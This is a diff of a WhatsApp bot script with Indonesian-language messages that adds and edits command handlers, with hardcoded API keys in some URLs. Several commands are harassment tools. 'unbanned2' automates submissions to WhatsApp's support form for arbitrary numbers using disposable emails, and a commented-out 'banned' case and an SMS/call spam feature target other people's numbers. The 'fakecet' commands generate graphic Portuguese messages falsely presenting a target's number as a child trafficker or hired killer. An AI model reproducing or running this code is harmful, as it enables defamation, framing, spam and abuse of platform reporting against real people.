 			await m.reply('Jumlah stiker lebih dari 30, bot akan mengirimkannya dalam obrolan pribadi.')
 			for (let i = 0; i < res.length; i++) {
-				conn.sendMessage(m.sender, { sticker: { url: res[i].url }})
+				await conn.sendImageAsSticker(m.sender, res[i].url, m, {
+                  packname: global.packname,
+                  author: global.author
+               })
 			}
 		} else {
 			for (let i = 0; i < res.length; i++) {
-				conn.sendMessage(m.chat, { sticker: { url: res[i].url }})
+				await conn.sendImageAsSticker(m.chat, res[i].url, m, {
+                  packname: global.packname,
+                  author: global.author
+               })
 			}
 		}
 	} else throw 'Input Query / Telesticker Url'
@@ -6120,17 +6424,6 @@ case 'swm': case 'take':
                 })
             }
             break
-case 'qc': {
-if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
-ini_txt = args.join(" ")
-let ppnyauser = await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
-  let ini_buffer = await fetchBuffer(`https://aemt.me/quotely?avatar=${ppnyauser}&name=${pushname}&text=${ini_txt}`)
-  await conn.sendImageAsSticker(m.chat, ini_buffer, m, {
-    packname: global.packname,
-    author: global.author
-  })
-       }
-break
 case 'fakewa': {
 if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
 ini_txt = args.join(" ")
@@ -6149,7 +6442,7 @@ case 'ttp5': {
 if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 ini_txt = args.join(" ")
-ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
+ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=GataDios&text=${ini_txt}`)
 await conn.sendImageAsSticker(m.chat, ini_buffer, m, {
                     packname: `${global.packname}`,
                     author: `${global.author}`
@@ -6161,7 +6454,7 @@ case 'attp2': {
 if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
 await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
 ini_txt = args.join(" ")
-ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
+ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=GataDios&text=${ini_txt}`)
 await conn.sendFile2(m.chat, ini_buffer, 'sticker.webp', '', m)
        }
 break
@@ -6312,7 +6605,17 @@ let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender :
 await conn.groupParticipantsUpdate(from, [users], 'demote')
 }
 break
-
+case 'listgc': {
+                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
+                 let teks = `🐼*GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
+                 for (let i of anulistg) {
+                     let metadata = await conn.groupMetadata(i)
+                     let response = await conn.groupInviteCode(i)
+                     teks += `🐼 *Name :* ${metadata.subject}\n🐼 *LinkGc :* https://chat.whatsapp.com/${response}\n🐼 *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n🐼 *ID :* ${metadata.id}\n🐼 *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n🐼 *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
+                 }
+                 conn.sendTextWithMentions(m.chat, teks, m)
+             }
+             break
 case 'hidetag': case 'hid':
 if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
@@ -6851,12 +7154,14 @@ var angka = shinchan_kawaii.split("|")[1]
 let katanya = `${kata}`.repeat(angka)
 await conn.sendMessage(m.chat, { text: `${katanya}` }, { quoted: blue})
 break
-case 'getcase':
+case 'getcase': {
 if (!isCreator) return paycall(global.ownercuy)
+if (!args[0]) return paytod(`Use ${prefix+command} block`)
 const getCase = (cases) => {
 return "case" + `'${cases}'` + fs.readFileSync("main.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
 }
-reply(`${getCase(q)}`)
+m.reply(`${getCase(q)}`)
+}
 break
 case 'q': case 'quoted': {
 if (!m.quoted) return paycall('Reply the Message!!')
@@ -6899,6 +7204,61 @@ form.append("__hs", "19729.BP:whatsapp_www_pkg.2.0.0.0.0")
 form.append("dpr", "1")
 form.append("__ccg", "UNKNOWN")
 form.append("__rev", "1010701544")
+form.append("__comment_req", "0")
+
+let res = await axioss({
+url,
+method: "POST",
+data: form,
+headers: {
+cookie
+}
+
+})
+reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
+let payload = String(res.data)
+if (payload.includes(`"payload":true`)) {
+reply(`Sukses✓`)
+} else reply(util.format(res.data))
+} catch (err) {reply(`${err}`)}
+} else reply('Masukkan nomor Yang mau di unban!')
+}
+break
+
+case 'unbanned2': {
+if (!isCreator) return
+if (m.quoted || q) {
+var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+var targetnya = tosend.split('@')[0]
+
+try {
+var axioss = require('axios')
+let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+const cheerio = require('cheerio');
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "+")
+form.append("phone_number", `+${targetnya}`,)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", `Пожалуйста, помогите мне открыть WhatsApp быстро, потому что у меня есть важная работа. Спасибо
++${targetnya}`)
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1007965968")
 form.append("__comment_req", "0")
 
 let res = await axioss({
@@ -7032,7 +7392,7 @@ console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) SHINCHAN SENPAI`);
 m.reply(`spam sms/call akan di kirim ke no target`)
 }
 break
-case 'banned': {
+/*case 'banned': {
 if (!isCreator) return m.reply('*khusus Owner*')
 if (m.quoted || q) {
 var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
@@ -7123,7 +7483,7 @@ Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui 
 } catch (err) {reply(`${err}`)}
 } else reply('Masukkan nomor target!')
 }
-break
+break*/
 case "unli": {
 if (!isCreator) return m.reply('*khusus Owner*')
 let t = text.split(',');
@@ -7244,6 +7604,18 @@ CPU: ${server.limits.cpu}%
 
 }
 
+break
+case 'fakecet': {
+if (!text) return m.reply(`${command} +62××××××`)
+conn.sendMessage(m.sender, {text: `Olá, sou dzul, sou um antagonista que gosta de crianças pequenas pode ser chamado de pedófilo, também costumo torturar os pais e mata-los na frente dos olhos dos filhos🔪🧪🗡️, não só isso porque me sinto em vão matando sem fazer nada faço sexo com ele a força mesmo até ele mati☠️ na frente do filho. Também vou oferecer uma escrava criança pequena, quem estiver a ler esta mensagem dou um desconto de 40% muito tentador podes fazer tudo com a escrava por um preço baixo conversa whatsapp me se estiveres interessado 👇👇👇👇.
+https://api.whatsapp.com/send?phone=${text}`}, {quoted: m})
+}
+break
+case 'fakecet2': {
+if (!text) return m.reply(`${command} +62××××××`)
+conn.sendMessage(m.sender, {text: `Olá, eu sou Zulfi, eu sou um assassino👹👺🔪🔪 Eu amo matar humanos, torturar humanos e até mesmo torturar animais🔪👪☠️☠️, se você contratar meus serviços eu farei como ordenado, como matar humanos e tirar seus órgãos, até mesmo temos uma arma de fogo👹👺☠️🔥🔥 para acelerar o processo de matar e não requer muito tempo e o que você está esperando, contrate meus serviços eu vou matar todos os seus obstáculos se você receber esta mensagem você recebe um desconto de 45% não é tentador o que você está esperando WhatsApp me se você estiver interessado👇👇
+https://api.whatsapp.com/send?phone=${text}`}, {quoted: m})
+}
 break
 //=================================================//
 
